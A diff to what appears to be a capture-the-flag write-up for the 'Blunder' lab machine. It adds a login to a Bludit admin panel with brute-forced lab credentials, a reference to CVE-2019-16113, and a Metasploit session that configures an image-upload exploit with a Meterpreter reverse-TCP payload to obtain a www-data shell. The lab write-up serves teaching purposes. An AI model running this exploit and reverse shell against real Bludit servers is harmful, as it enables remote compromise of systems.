@@ -129,6 +129,28 @@ Running the exploit I get some correct credentials after a while :
 ![bf](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/bf.png)
 
 ``fergus:RolandDeschain``
+
 Obviously I can use those creds to login on ``/admin`` and access the dashboard :
 
 ![dashboard](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/dashboard.png)
+
+While searching for a possible vulnerability previously I also found [CVE-2019-16113](http://cve.circl.lu/cve/CVE-2019-16113)
+Another vulnerability (remote command execution) for the **Bludit 3.9.2** version.
+
+I'm going to use metasploit to do that to speed things up, but I recommed doing this one exploit manually as it learned me a few new tricks.
+
+```console
+msf5 > use exploit/linux/http/bludit_upload_images_exec
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
+BLUDITPASS => RolandDeschain
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
+BLUDITUSER => fergus
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
+RHOSTS => 10.10.10.191
+msf5 exploit(linux/http/bludit_upload_images_exec) > set LHOST tun0
+```
+### www-data shell
+After running the exploit we grab a low-privileged shell to the machine :
+
+![www-data](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/metasploit.png)
